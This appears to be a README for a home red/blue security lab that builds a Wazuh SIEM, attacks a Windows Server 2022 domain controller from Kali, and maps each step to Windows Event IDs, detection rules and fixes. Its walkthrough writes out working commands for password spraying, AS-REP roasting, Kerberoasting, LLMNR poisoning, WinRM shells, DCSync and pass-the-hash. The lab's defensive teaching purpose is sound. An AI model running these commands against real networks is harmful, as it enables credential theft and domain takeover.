# Red/Blue Security Lab — Wazuh SIEM, Windows Server 2022 & Offensive Testing

A fully isolated, self-hosted **red team / blue team** lab built on VirtualBox.
It walks the complete security loop: **build the range → attack it → detect it with a SIEM → fix it → prove the fix holds.**

Every technique is performed against a machine I own, on a network with no route to the internet. The point is not to "get root" — it is to learn how an intrusion reads in a real Security Operations Centre, and how to close the gap after you find it.

![Platform](https://img.shields.io/badge/platform-VirtualBox_7.2-1F4FA0?style=flat-square)
![SIEM](https://img.shields.io/badge/SIEM-Wazuh_4.14.8-00A3E0?style=flat-square)
![Target](https://img.shields.io/badge/target-Windows_Server_2022-0078D6?style=flat-square)
![Attacker](https://img.shields.io/badge/attacker-Kali_Linux-557C94?style=flat-square)
![License](https://img.shields.io/badge/use-Authorized_lab_only-critical?style=flat-square)

---

## Table of Contents

- [Overview](#overview)
- [Legal & Ethical Use](#legal--ethical-use)
- [Lab Architecture](#lab-architecture)
- [Repository Structure](#repository-structure)
- [Prerequisites](#prerequisites)
- [Part 1 — Build the Lab](#part-1--build-the-lab)
  - [1.1 VirtualBox network](#11-virtualbox-network)
  - [1.2 SIEM-Ubuntu / Wazuh stack](#12-siem-ubuntu--wazuh-stack)
  - [1.3 Enroll agents](#13-enroll-agents)
  - [1.4 Enable Windows telemetry](#14-enable-windows-telemetry)
  - [1.5 Harden Windows Server 2022](#15-harden-windows-server-2022)
- [Part 2 — The Penetration Walkthrough](#part-2--the-penetration-walkthrough)
  - [Phase 1 — Recon](#phase-1--recon)
  - [Phase 2 — Enumeration](#phase-2--enumeration)
  - [Phase 3 — Credential attacks](#phase-3--credential-attacks)
  - [Phase 4 — Land a shell](#phase-4--land-a-shell)
  - [Phase 5 — Own the domain](#phase-5--own-the-domain)
- [Part 3 — Detection (Blue Team)](#part-3--detection-blue-team)
  - [The detection matrix](#the-detection-matrix)
  - [Wazuh queries](#wazuh-queries)
  - [Custom detection rules](#custom-detection-rules)
- [Part 4 — Remediation](#part-4--remediation)
- [Part 5 — The Red/Blue Loop](#part-5--the-redblue-loop)
- [Troubleshooting](#troubleshooting)
- [Windows Event ID Quick Reference](#windows-event-id-quick-reference)
- [Tools Used](#tools-used)
- [Roadmap](#roadmap)
- [Author & Credits](#author--credits)

---

## Overview

This project documents a home security lab that produces four artefacts a hiring manager actually looks for:

1. A **working SIEM** (Wazuh 4.14.8) collecting real endpoint telemetry.
2. A **documented penetration test** of a Windows Server 2022 Domain Controller, run from Kali.
3. **Detection engineering** — the exact Windows Event IDs and Wazuh rules that expose each technique.
4. **Remediation** — the controls applied afterwards, plus a re-attack proving each one now fails or fires.

The guiding idea is simple:

> **Attack it · Detect it · Fix it · Prove the fix · Write it down.**

A detection you have never watched fire is not a detection — it is a hope. So every offensive step in this README is paired with the exact blue-team evidence it leaves behind.

---

## Legal & Ethical Use

> **Everything here runs against VirtualBox VMs on my own hardware, on a segment (`intnet`, `10.0.0.0/24`) with no route to or from the internet or my physical LAN.**

- All test targets are machines I own and built myself.
- No third-party systems, networks, or accounts are touched.
- The tools shown (`Responder`, `Hydra`, `netexec`, `Impacket`, `hashcat`, `nmap`) are offensive and can be **loud and destructive** off the bench.
- Running any of these against a host you do **not** own or lack **written authorisation** for is a crime in virtually every jurisdiction.

Keep it on the lab bench. The skill is identical on both sides of the law — only the paperwork differs.

---

## Lab Architecture

### Topology

```
                    HOST (Windows 11) · VirtualBox 7.2.12
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                    │
  │   ┌───────────────┐        ┌───────────────────┐                  │
  │   │  Kali Linux   │        │   SIEM-Ubuntu     │                  │
  │   │  10.0.0.30    │◄──────►│   10.0.0.40       │                  │
  │   │  ATTACKER     │        │  Wazuh 4.14.8     │                  │
  │   │  (agent 001)  │        │  manager/indexer/ │                  │
  │   └───────┬───────┘        │  dashboard/filebeat│                 │
  │           │                └───────────────────┘                  │
  │           │                                                        │
  │           │        VirtualBox internal network (intnet)            │
  │           │        10.0.0.0/24  ·  isolated, no gateway            │
  │           ▼                                                        │
  │   ┌───────────────────────┐   ┌───────────────────────┐           │
  │   │  WinServer 2022 DC    │   │  WindowsClient (Win11)│           │
  │   │  10.0.0.10            │   │  10.0.0.50            │           │
  │   │  domain: corp.local   │   │  (agent: wincli-01)   │           │
  │   │  (agent 002 "Server") │   └───────────────────────┘           │
  │   └───────────────────────┘                                        │
  │                                                                    │
  │   Optional per-VM 2nd adapter → NAT (10.0.3.0/24 / 10.0.2.15)      │
  │   used ONLY to download the Wazuh agent, then detached.           │
  └──────────────────────────────────────────────────────────────────┘
```

### Host inventory

| Machine | Role | Lab IP (`intnet`) | NAT IP | RAM | OS |
|---|---|---|---|---|---|
| **SIEM-Ubuntu** | Wazuh server (manager, indexer, dashboard, filebeat) | `10.0.0.40` | `10.0.3.15` | 8 GB | Ubuntu 26.04.1 LTS |
| **Kali** | Attacker / assessment host | `10.0.0.30` | `10.0.3.20` | 4 GB | Kali Linux 2026.2 |
| **WinServer** | Domain Controller (`corp.local`) — the target | `10.0.0.10` | — | 4 GB | Windows Server 2022 (build 20348.587) |
| **WindowsClient** | Workstation endpoint | `10.0.0.50` | — | — | Windows 11 |

> **Note on addressing:** early build volumes (agent install / hardening) placed WinServer at `10.0.0.50` as a member server. The red/blue campaign promotes it to the Domain Controller at `10.0.0.10` with domain `corp.local`. Both states are documented; use whichever matches your snapshot.

### Why two network segments?

- `intnet` (`10.0.0.0/24`) is **VM-to-VM only** — no gateway, invisible to the host LAN. All attack traffic stays here.
- The optional **NAT** adapter (`10.0.3.0/24` on Ubuntu/Kali, `10.0.2.15` on Windows guests) exists only so a guest can download the Wazuh agent from `packages.wazuh.com`. It gives **no inbound route** into the lab.
- **Always enrol agents against the `intnet` IP (`10.0.0.40`), never the NAT IP.** NAT guests cannot reach each other — using the NAT address is the single most common "agent shows Disconnected" mistake.

### Wazuh pipeline

```
Agent → manager (:1514) → (rules/decoders) → alerts.json
      → Filebeat → indexer (:9200) → dashboard (:443)
```

Debug along this arrow, in order, whenever something does not show up in the UI.

---

## Repository Structure

```
red-blue-security-lab/
├── README.md                                   ← this file
├── .gitignore
├── SIEM-Lab-Docs/
│   ├── Wazuh-4.14.8-Lab-Guide.pdf              Volume 1 — operating the SIEM
│   ├── Windows-Server-2022-Hardening-and-Detection-Lab.pdf   Volume 2 — audit & harden
│   ├── Attacking-Windows-Server-2022-RedTeam-Companion.pdf   Volume 3 — offensive tools, explained
│   ├── Attack-and-Watch-Live-Exploitation-Runbook.pdf        Volume 4 — the full campaign
│   ├── Wazuh-Detection-Companion-for-Windows-Attacks.pdf     Volume 5 — blue-team reference
│   ├── pdf1-wazuh-guide.html … pdf5-…html      HTML sources for the PDFs
│   ├── style.css, build_pdfs.py, verify_pdfs.py  document build toolchain
│   └── audit_layout.py
└── RedBlue-Lab/                                (companion folder)
    ├── Install-WazuhAgent.ps1                   one-file Windows agent installer
    ├── RedBlue-Lab-Vol3-Wazuh-Agent-Windows-Install.pdf   agent-install manual
    ├── red-blue-agent-install.html
    ├── probe_msi.py, validate.py, check_html.py
    └── build_pdfs.py, verify_pdfs.py, style.css
```

### What each volume covers

| Volume | Title | Focus |
|---|---|---|
| **1** | Using Your Wazuh SIEM | Architecture, alerts, rules, FIM, SCA, API, troubleshooting |
| **2** | Hardening Windows Server & Validating Detection | Audit from Kali, harden, prove detection with 9 controlled tests |
| **3** | Attacking Your Own Windows Server | Recon → enumeration → credential attacks → shell → impact, every flag explained |
| **4** | Attack & Watch — Live Exploitation Runbook | The single end-to-end campaign with the matching detection at every phase |
| **5** | Wazuh Detection Companion | Technique → Event ID → dashboard search → rule, as a lookup table |
| **Red/Blue** | Installing the Wazuh Agent on Windows | Turning blind Windows VMs into monitored targets |

---

## Prerequisites

- **VirtualBox** 7.2.x on a host with ≥ 16 GB RAM and hardware virtualisation enabled.
- An **Ubuntu 26.04.1 LTS** VM (8 GB RAM, 4 vCPU) for the Wazuh server.
- A **Kali Linux** VM (4 GB RAM).
- A **Windows Server 2022** ISO and a **Windows 11** ISO.
- Internet access on the **host** (only to download ISOs and the Wazuh packages).
- Familiarity with the Linux shell. No prior security-ops experience required — Volume 1 starts from concepts.

---

## Part 1 — Build the Lab

### 1.1 VirtualBox network

Create an internal network and attach the VM primary interfaces to it.

```powershell
# On the host, with every VM powered off.
# Attach each VM's first NIC to the internal network "intnet".
VBoxManage modifyvm "SIEM-Ubuntu"   --nic1 intnet --cable1 on
VBoxManage modifyvm "Kali"          --nic1 intnet --cable1 on

# Windows guests: intnet on NIC1, optional NAT on NIC2 (for agent download only).
VBoxManage modifyvm "WinServer"     --nic1 intnet --cable1 on
VBoxManage modifyvm "WindowsClient" --nic1 intnet --cable1 on
VBoxManage modifyvm "WinServer"     --nic2 nat --nictype2 82540EM
VBoxManage modifyvm "WindowsClient" --nic2 nat --nictype2 82540EM
```

Set static lab addresses. On Windows, from an **Administrator** PowerShell:

```powershell
# Windows Server 2022 → 10.0.0.10
Set-NetIPInterface -InterfaceAlias "Ethernet" -Dhcp Disabled
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.0.0.10 -PrefixLength 24

# Detach the install ISO when done:
VBoxManage modifyvm "WinServer" --medium none
```

Host port-forwards for access from the host (VM powered off):

```powershell
VBoxManage modifyvm "SIEM-Ubuntu" --natpf2 "dashboard,tcp,127.0.0.1,4433,10.0.3.15,443"
VBoxManage modifyvm "SIEM-Ubuntu" --natpf2 "ssh-host,tcp,127.0.0.1,2222,10.0.3.15,22"
VBoxManage modifyvm "SIEM-Ubuntu" --natpf2 "indexer-api,tcp,127.0.0.1,9200,10.0.3.15,9200"
VBoxManage modifyvm "SIEM-Ubuntu" --natpf2 "manager-api,tcp,127.0.0.1,55000,10.0.3.15,55000"
```

### 1.2 SIEM-Ubuntu / Wazuh stack

The Wazuh 4.14.8 all-in-one stack is pre-installed on `SIEM-Ubuntu`. Confirm all four services are healthy:

```bash
sudo systemctl status wazuh-manager wazuh-indexer wazuh-dashboard filebeat --no-pager
# expect four "active"

sudo systemctl is-active wazuh-manager wazuh-indexer wazuh-dashboard filebeat

curl -sk -u admin:'<MANAGER_PASSWORD>' 'https://127.0.0.1:9200/_cluster/health?pretty'
# expect "status": "green"
```

Access the dashboard from the host browser at **`https://127.0.0.1:4433`** (accept the self-signed certificate — it is issued by the lab's own root CA).

| Service | Port | Username | Notes |
|---|---|---|---|
| Wazuh dashboard | 443 (→ 4433) | `admin` | Main UI |
| Wazuh indexer API | 9200 | `admin` | OpenSearch JSON |
| Wazuh manager API | 55000 | `wazuh-wui` | Agents, rules, SCA |
| Agent events | 1514 | — | Agent → manager |
| Agent enrolment | 1515 (authd 55000) | — | First-time registration |

> **Security note:** the reference documents were written with lab-grade passwords. Replace every credential before this VM is ever exposed to a real network:
>
> ```bash
> sudo /usr/share/wazuh-indexer/plugins/opensearch-security/tools/wazuh-passwords-tool.sh -a -p 'YourNewStrongPassword' -u admin
> sudo systemctl restart wazuh-indexer wazuh-dashboard
> ```
>
> Keep all credentials out of your Git history. Use environment variables or a secrets manager, never a committed file.

**Take a snapshot** once healthy: `wazuh-working` (VM powered off).

### 1.3 Enrol agents

**Linux (Kali, becomes agent 001):**

```bash
WAZUH_MANAGER='10.0.0.40' WAZUH_AGENT_NAME='kali' WAZUH_AGENT_GROUP='linux,attackers' \
curl -s https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.14.8-1_amd64.deb \
| sudo WAZUH_MANAGER='10.0.0.40' WAZUH_AGENT_NAME='kali' dpkg --install

sudo systemctl daemon-reload
sudo systemctl enable --now wazuh-agent
```

**Windows (WinServer → `winsrv-01`, WindowsClient → `wincli-01`):**

Give the VM a NAT adapter (already done above), then install:

```powershell
# Download
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.8-1.msi `
  -OutFile $env:TEMP\wazuh-agent.msi

# Install silently, pointing at the intnet address of the manager
$msi = "$env:TEMP\wazuh-agent.msi"
$msiArgs = @(
  "/i", $msi, "/quiet", "/norestart", "/l*v", "$env:TEMP\wazuh-msi.log",
  "WAZUH_MANAGER=10.0.0.40",
  "WAZUH_MANAGER_PORT=1514",
  "WAZUH_REGISTRATION_SERVER=10.0.0.40",
  "WAZUH_REGISTRATION_PORT=55000",
  "WAZUH_AGENT_NAME=winsrv-01",
  "WAZUH_AGENT_GROUP=windows,servers"
)
Start-Process msiexec.exe -ArgumentList $msiArgs -Wait

# Service is named WazuhSvc, NOT "Wazuh" — this trips up everyone.
Set-Service -Name "WazuhSvc" -StartupType Automatic
Start-Service -Name "WazuhSvc"

# Open the inbound listener (outbound is allowed by default).
New-NetFirewallRule -DisplayName "Wazuh Agent 1514" `
  -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1514 -Profile Any
```

Or, from the companion folder, run the one-file installer:

```powershell
powershell -ExecutionPolicy Bypass -File .\Install-WazuhAgent.ps1 `
  -AgentName winsrv-01 -AgentGroup windows,servers
```

**Verify on the manager:**

```bash
sudo /var/ossec/bin/agent_control -l
# ID: 1 ... Active
# ID: 2 ... winsrv-01  Active
# ID: 3 ... wincli-01  Active
```

Paste the agent's own log when troubleshooting: it is **`C:\Program Files (x86)\ossec-agent\ossec.log`** — *not* `wazuh-agent.log` (that filename is Linux-only).

### 1.4 Enable Windows telemetry

Wazuh only detects what Windows audits. On the Domain Controller, enable the categories the attack chain needs:

```powershell
# Process command-line auditing (huge for red/blue labs)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
  /v ProcessCreationIncludeCmdLine_Enabled /t REG_QWORD /d 1 /f
```

```cmd
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Logoff" /success:enable /failure:enable
auditpol /set /subcategory:"Account Lockout" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable /failure:enable

auditpol /get /category:* | findstr /i "Logon Advanced Audit"
```

**Add Sysmon** for process/network/registry detail Wazuh decodes natively:

```powershell
Expand-Archive .\Sysmon.zip -DestinationPath C:\Sysmon
cd C:\Sysmon
.\Sysmon64.exe -i      # install with default config
.\Sysmon64.exe -c      # confirm active config
```

Sysmon process creation arrives as event `1`; the stock channel equivalent is `4688`.

### 1.5 Harden Windows Server 2022

Volume 2 is the full audit-and-harden exercise. The high-value controls:

```cmd
:: Password + lockout policy — defeats brute force and spraying
net accounts /minpwlen:14 /lockoutthreshold:5 /lockoutduration:15 /lockoutobservation:30
```

```powershell
# Audit for roastable accounts (should be empty on a sane domain)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# SMB hardening (verify the good defaults are in place)
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSMB1Protocol
```

Then, via Group Policy: **disable LLMNR and NetBIOS over TCP/IP** on all adapters — this removes the door `Responder` uses. Restrict WinRM (`5985`) to management hosts, and protect credentials with **LSA protection (`RunAsPPL`)** and **Credential Guard**. All of these are re-verified in [Part 4 — Remediation](#part-4--remediation).

---

## Part 2 — The Penetration Walkthrough

> Target: **WinServer DC `10.0.0.10`** (`corp.local`), attacked from **Kali `10.0.0.30`**, watched by **Wazuh on `10.0.0.40`**.
> **Snapshot the target first.** Every phase: run the red command, then check the blue evidence before continuing.

### Phase 1 — Recon

Find the host and map its open doors.

```bash
mkdir -p ~/lab/campaign4 && cd ~/lab/campaign4
echo "# Campaign - $(date -Iseconds)" > notes.txt

# Host discovery
sudo nmap -sn 10.0.0.0/24 -oN recon-hosts.txt

# Full TCP scan, then a careful version pass on what is open
sudo nmap -Pn -sS -p- --min-rate 2000 -T4 10.0.0.10 -oN nmap-all.txt
sudo nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 \
  10.0.0.10 -oN nmap-services.txt
```

**Reading the result:** ports `88` (Kerberos), `389` (LDAP), `445` (SMB), `5985` (WinRM) in that cluster means **Domain Controller**. SMB signing is required and SMBv1 is off here, so the only realistic way in is **credentials**.

> **VirtualBox quirk:** if the target suddenly stops answering mid-scan, its virtual NIC has fallen idle. Re-plug it from the host:
> `VBoxManage controlvm "WinServer" setlinkstate1 off` then `... on`.

**Blue check:** `agent.name:SERVER AND rule.level:>=8` — scanning is faint; you are baselining the quiet.

### Phase 2 — Enumeration

```bash
netexec smb 10.0.0.10
smbclient -L //10.0.0.10 -N
enum4linux -a 10.0.0.10 > enum4linux.txt

ldapsearch -x -LLL -H ldap://10.0.0.10 -s base -b "" namingContexts   # → DC=corp,DC=local
dig @10.0.0.10 corp.local NS
nslookup 10.0.0.10 10.0.0.10
```

**Expected (from the live run):** `Windows Server 2022 Build 20348 x64 (name:SERVER) (domain:corp.local) (signing:True) (SMBv1:None) (Null Auth:True)`. Anonymous LDAP object search is refused (`Operations error`) — good defence.

**Blue check:** `agent.name:SERVER AND data.win.system.eventID:4625` — null-session/service logins show up as failed logons from `10.0.0.30`.

### Phase 3 — Credential attacks

Four attacks, tried in the order they usually succeed. **Stop the moment one works.**

**Know the rules first** (with any one valid login):

```bash
netexec smb 10.0.0.10 -u <USER> -p '<PASS>' --pass-pol
```

**Build a targeted wordlist** (beats blind guessing):

```bash
cat > lab-passwords.txt <<'EOF'
Password1
Password123!
Passw0rd
P@ssw0rd
Welcome1
Admin123!
Corp@2022
Corp@2026
Server2022
Server2022!
labadmin
labadmin123
ChangeMe123!
Summer2026!
Winter2026!
EOF
```

**Attack 1 — Password spray** (safest; one password across many users):

```bash
cat > users.txt <<'EOF'
administrator
labadmin
guest
svc-backup
EOF

netexec smb 10.0.0.10 -u users.txt -p 'Winter2026!' --continue-on-success
netexec smb 10.0.0.10 -u users.txt -p 'Corp@2026'   --continue-on-success
```

**Attack 2 — AS-REP roast** (no password needed, needs one weak account):

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10 \
  -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

**Attack 3 — Kerberoast** (needs any one valid login):

```bash
impacket-GetUserSPNs 'corp.local/USER:PASS' -dc-ip 10.0.0.10 -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

**Attack 4 — LLMNR/NBT-NS poisoning** (lab only, forever):

```bash
sudo responder -I eth0 -dwv
# trigger a name lookup on the victim, then crack captured hashes:
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt
```

Optionally, brute-force a single account when there is no lockout:

```bash
hydra -l administrator -P lab-passwords.txt smb://10.0.0.10
kerbrute userenum --dc 10.0.0.10 -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**Blue check:** `agent.name:SERVER AND data.win.system.eventID:(4625 OR 4740 OR 4768 OR 4769)` — the loudest phase. A spike of `4625` then a success is the "they got in" story.

### Phase 4 — Land a shell

A password is a door key. WinRM (`5985`) turns it into a PowerShell shell.

```bash
# Prove the credential
netexec winrm 10.0.0.10 -u administrator -p 'THE_PASSWORD' -x whoami

# Interactive shell
evil-winrm -i 10.0.0.10 -u administrator -p 'THE_PASSWORD'
# inside: whoami ; hostname ; net user

# Read the directory now that you are a valid identity
ldapsearch -x -H ldap://10.0.0.10 -D 'administrator@corp.local' -w 'THE_PASSWORD' \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf
```

**Blue check:** `agent.name:SERVER AND data.win.system.eventID:(4624 OR 4688 OR 4104)`.
The successful `4624` (logon type 3) after the `4625` storm is the moment of compromise; `4688` captures every command you ran.

### Phase 5 — Own the domain

The honest proof of impact for a Domain Admin is two commands. **Then stop.**

```bash
# DCSync — dump domain NT hashes (including krbtgt)
impacket-secretsdump 'corp.local/administrator:THE_PASSWORD@10.0.0.10' -just-dc-ntlm

# Pass-the-Hash — authenticate with the NT hash, no cracking needed
netexec smb 10.0.0.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:NT_HASH_HERE'
```

Clean impact demo the defender is guaranteed to see (create then remove a throwaway account):

```cmd
net user pentest-user 'Str0ng-Lab-Pass!' /add
net localgroup Administrators pentest-user /add
:: ... run the blue check between add and delete ...
net localgroup Administrators pentest-user /delete
net user pentest-user /delete
```

**Blue check:** `agent.name:SERVER AND data.win.system.eventID:(4662 OR 4720 OR 4732)`.
`4662` on the replication GUIDs (`1131f6aa-…` / `1131f6ad-…`) is DCSync — the event that should terrify a defender.

**Then clean up:** restore the `pre-campaign` snapshot. Understanding the ceiling is the point; living there is not.

---

## Part 3 — Detection (Blue Team)

### The detection matrix

| Technique (phase) | Windows Event ID(s) | Wazuh search |
|---|---|---|
| Username enumeration (Kerberos) | `4768`, `4771` | `agent.name:SERVER AND data.win.system.eventID:(4768 OR 4771)` |
| Password spray / brute force | `4625`, `4740` | `agent.name:SERVER AND data.win.system.eventID:4625` |
| Account lockout | `4740` | `agent.name:SERVER AND data.win.system.eventID:4740` |
| AS-REP roasting | `4768` | `agent.name:SERVER AND data.win.system.eventID:4768` |
| Kerberoasting | `4769` (RC4) | `agent.name:SERVER AND data.win.system.eventID:4769` |
| Successful network logon (shell) | `4624` (type 3) | `agent.name:SERVER AND data.win.system.eventID:4624` |
| Remote command execution | `4688` | `agent.name:SERVER AND data.win.system.eventID:4688` |
| PowerShell abuse | `4104`, `4103` | `agent.name:SERVER AND data.win.system.eventID:4104` |
| DCSync (replication read) | `4662` | `agent.name:SERVER AND data.win.system.eventID:4662` |
| Pass-the-Hash | `4624` (odd session) | `agent.name:SERVER AND data.win.system.eventID:4624` |
| Account creation / group add | `4720`, `4732`, `4726` | `agent.name:SERVER AND data.win.system.eventID:(4720 OR 4732 OR 4726)` |
| Privileged logon | `4672` | `agent.name:SERVER AND data.win.system.eventID:4672` |

### Wazuh queries

Copy-paste into the Alerts search bar (Lucene syntax; `AND` must be uppercase):

```
rule.level:>=10                                              # triage start point
agent.name:SERVER AND rule.level:>=8                         # high alerts on the DC
agent.name:SERVER AND data.win.system.eventID:4625           # failed logons
NOT rule.level:<8 AND agent.name:kali                        # suppress Kali noise
data.win.eventdata.ipAddress:10.0.0.30                       # everything from the attacker
```

**Read the attack as a timeline** — run these in order over your campaign window:

```
agent.name:SERVER AND data.win.system.eventID:4625                     # the brute
agent.name:SERVER AND data.win.system.eventID:4624                     # the success
agent.name:SERVER AND data.win.system.eventID:(4688 OR 4104)           # hands on keyboard
agent.name:SERVER AND data.win.system.eventID:4662                     # the payoff
```

`4625 → 4624 → 4688/4104 → 4662` in sequence from `10.0.0.30` is the fingerprint of the whole intrusion.

### Custom detection rules

Add to `/var/ossec/etc/local_rules.xml` (local rule IDs are `100000–199999`), then validate and deploy:

```bash
sudo /var/ossec/bin/wazuh-logtest -t          # validate XML BEFORE restarting
sudo systemctl restart wazuh-manager
sudo /var/ossec/bin/agent_control -R 002      # agent 002 = WinServer: refresh config
```

**Spray / brute-force frequency rule (fires before lockout):**

```xml
<rule id="100121" level="10" frequency="8" timeframe="180">
  <if_sid>60122</if_sid>
  <same_source_ip />
  <description>Eight or more Windows logon failures from one source in 3 minutes</description>
  <mitre><id>T1110.003</id></mitre>
</rule>
```

**DCSync shape rule (catch it even without full GUID tuning):**

```xml
<rule id="100120" level="12" frequency="6" timeframe="120">
  <if_sid>60122</if_sid>
  <same_source_ip />
  <description>Rapid LDAP object access from one source - possible DCSync enumeration</description>
  <mitre><id>T1003.006</id></mitre>
</rule>
```

> A rule that never fires in Wazuh is a rule you never tested. Re-run the attack and watch it trigger.

---

## Part 4 — Remediation

This is the half that gets paid. Apply each control, then re-run the matching attack and confirm it now fails or is deafening.

| Weakness proven | Fix | Detection to keep |
|---|---|---|
| Weak / guessable passwords | Length 14+, complexity, lockout, MFA | `4625` + `4740` |
| No lockout | `net accounts /minpwlen:14 /lockoutthreshold:5 /lockoutduration:15 /lockoutobservation:30` | `4740` |
| AS-REP-roastable accounts | Audit `DoesNotRequirePreAuth`; use gMSA / 25+ char service passwords; disable RC4 | `4768` |
| Kerberoastable service accounts | gMSA (120-char random passwords); remove unused SPNs; AES-only | `4769` (RC4) |
| LLMNR / NetBIOS enabled | Disable via GPO | NetNTLM auth from odd hosts |
| WinRM exposed widely | Restrict `5985` to admin hosts or use HTTPS `5986` | `4624` type 3 + `4688` |
| DCSync possible | Least privilege / tiered admin; Credential Guard; LSA protection (`RunAsPPL`); rotate `krbtgt` twice | `4662` replication GUIDs |
| Unpatched build `20348.587` | Enable Windows Update / WSUS | Vulnerability module |
| Built-in `administrator` in use | Windows LAPS, named admins, Protected Users group | `4672` |

**Controls already correct — keep them:** SMB signing required (blocks relay), SMBv1 disabled (no EternalBlue surface), anonymous LDAP search denied, RDP closed on the lab interface.

**The single biggest win:** a domain **lockout policy + long passwords**, plus **disabling LLMNR/NetBIOS**. Those two moves defeat the attacks most likely to succeed against this lab.

---

## Part 5 — The Red/Blue Loop

The loop that turns study notes into a portfolio artefact:

```
Snapshot → Recon → Enumerate → Get credentials → Shell → Own the domain
        → Watch Wazuh fire → Restore snapshot → Fix → Re-attack → watch it fail
```

Do it in both directions:

1. With the agent installed, confirm you can **see** the attack.
2. Harden the target, run it again, and confirm the gap is **closed** — either it no longer works, or it now fires loudly.

Finding a gap is half the job; proving the fix works is the other half, and it is the half people skip.

**Artifacts to capture for the writeup:** the `4625` spike, the successful `4624`, the `4662` (if it fired), and the alerts-by-severity overview for the hour.

---

## Troubleshooting

Real issues hit while building this lab, and their fixes.

| Symptom | Cause | Fix |
|---|---|---|
| `Service 'Wazuh' does not exist` | Wrong service name | It is **`WazuhSvc`**, not `Wazuh` |
| MSI exits `0` but no service | Argument list built into `$args` | `$args` is reserved in PowerShell — name it `$msiArgs` |
| `ERROR (1208)` on enrolment | Port `55000` unreachable | Check the manager is up, the IP is the **intnet** address, and `55000` is open |
| Install hangs on download | No internet route | Add the NAT adapter, or sideload the MSI and use `-SkipDownload` |
| Agent `Active` but no alerts | No telemetry yet | Enable audit policy + Sysmon; generate a test event |
| Alerts in `alerts.json` but not the UI | Filebeat/indexer problem | See the filebeat seccomp fix below |
| Dashboard shows no new alerts | `filebeat` crashed | See below |
| Target stops answering mid-scan | VirtualBox guest NIC fell idle | `VBoxManage controlvm "WinServer" setlinkstate1 off` then `... on` |
| Agent shows `Disconnected` | Bound to the NAT address | Enrol against `10.0.0.40` (intnet), never the NAT IP |
| Config changes ignored | Agent has not re-read | `agent_control -R <id>` then `-i <id>` on the manager |

**The filebeat crash (fixed 2026-10-10):**

Symptom: `wazuh-manager`, `wazuh-indexer`, `wazuh-dashboard` all `active` but `filebeat` `failed`, dashboard silent. Logs show `runtime/cgo: pthread_create failed: Operation not permitted` — filebeat's built-in seccomp filter blocks the `clone3` syscall on newer kernels.

Fix — append to `/etc/filebeat/filebeat.yml`:

```yaml
seccomp:
  enabled: false
```

```bash
sudo systemctl reset-failed filebeat
sudo systemctl start filebeat
```

**Health check (one line):**

```bash
systemctl is-active wazuh-manager wazuh-indexer wazuh-dashboard filebeat
sudo curl -sk -u 'admin:<MANAGER_PASSWORD>' 'https://127.0.0.1:9200/_cluster/health?pretty'
```

Four `active` + cluster `green` means any quietness is a **detection** problem, not an **infrastructure** one.

**Out-of-band recovery channel** (needs neither SSH nor working networking):

```powershell
VBoxManage guestcontrol "SIEM-Ubuntu" run --username ubuntu --password '<pw>' `
  --exe "/bin/bash" -- -c "your-command-here"
```

---

## Windows Event ID Quick Reference

| ID | Meaning | Phase / Value |
|---|---|---|
| `4624` | Successful logon (type 3 = network) | Shell gained |
| `4625` | Failed logon | Brute force / spray |
| `4648` | Logon with explicit credentials | Alternate creds |
| `4672` | Special privileges assigned | Privileged logon |
| `4688` | Process creation (with command line if audited) | Every command run |
| `4720` | User account created | Impact demo |
| `4726` | User account deleted | Cleanup |
| `4732` | Member added to a security group | Privilege escalation |
| `4740` | Account locked out | Went too fast |
| `4768` | Kerberos TGT issued/failed | AS-REP roast / enum |
| `4769` | Kerberos service ticket requested | Kerberoasting |
| `4771` | Kerberos pre-auth failed | Enumeration |
| `4103` / `4104` | PowerShell module / script-block logging | PowerShell abuse |
| `4662` | Object access on replication GUIDs | **DCSync** |
| `7045` | Service installed | Remote service / lateral movement |

*(Sysmon: `1` = process create, `3` = network connect, `11` = file create.)*

---

## Tools Used

**Offensive (Kali):** `nmap` · `netexec` (nxc/cme) · `smbclient` · `enum4linux` · `ldapsearch` · `Responder` · `Hydra` · `Kerbrute` · Impacket (`GetNPUsers`, `GetUserSPNs`, `secretsdump`) · `evil-winrm` · `hashcat`

**Defensive / SIEM:** Wazuh 4.14.8 (manager, indexer, dashboard, filebeat) · Sysmon · Windows advanced audit policy · VirtualBox

**Document toolchain:** Python (`build_pdfs.py`, `verify_pdfs.py`, `validate.py`), headless Edge, HTML/CSS.

---

## Roadmap

- [ ] Turn the audit-and-harden steps into an idempotent PowerShell / Ansible playbook.
- [ ] Add **Suricata** as a network sensor (NDR) alongside the agent-based SIEM.
- [ ] Map every detection to **MITRE ATT&CK** and publish a coverage heatmap.
- [ ] Automate the campaign (snapshot → attack → collect screenshots → restore) as a script.
- [ ] Add a second DC and practise **lateral movement** and tiered administration.

---

## Author & Credits

Built and documented as a hands-on red/blue learning project. The lab, the attacks, the detections, and the fixes were all performed against self-hosted VirtualBox VMs.

